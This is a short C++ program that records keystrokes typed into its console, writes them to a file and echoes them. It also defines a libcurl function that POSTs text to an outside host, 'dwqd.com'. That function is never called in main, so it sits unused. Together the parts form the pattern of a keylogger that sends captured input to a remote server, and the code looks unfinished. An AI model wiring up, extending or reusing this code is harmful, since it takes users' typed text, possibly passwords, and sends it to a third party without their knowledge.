#include <iostream>
#include <fstream>
#include <conio.h>
#include <curl/curl.h>

void sendTextToServer(const std::string &text) {
    CURL *curl;
    CURLcode res;

    curl_global_init(CURL_GLOBAL_DEFAULT);
    curl = curl_easy_init();
    if (curl) {
        curl_easy_setopt(curl, CURLOPT_URL, "http://dwqd.com");
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, text.c_str());

        res = curl_easy_perform(curl);

        if (res != CURLE_OK) {
            std::cerr << "curl_easy_perform() failed: " << curl_easy_strerror(res) << std::endl;
        }

        curl_easy_cleanup(curl);
    }

    curl_global_cleanup();
}

int main() {
    std::ofstream outputFile("i.txt");
    if (!outputFile) {
        std::cerr << "Could not open file for writing!" << std::endl;
        return 1;
    }

    std::cout << "Enter the text (press ESC to exit):" << std::endl;
    std::string inputText;

    while (true) {
        char ch = _getch();
        if (ch == 27) {
            break; 
        }
        outputFile << ch; 
        std::cout << ch; 
        inputText += ch; 
    }

    outputFile.close();

    std::cout << "\nThe recording is complete!" << std::endl;

    return 0;
}
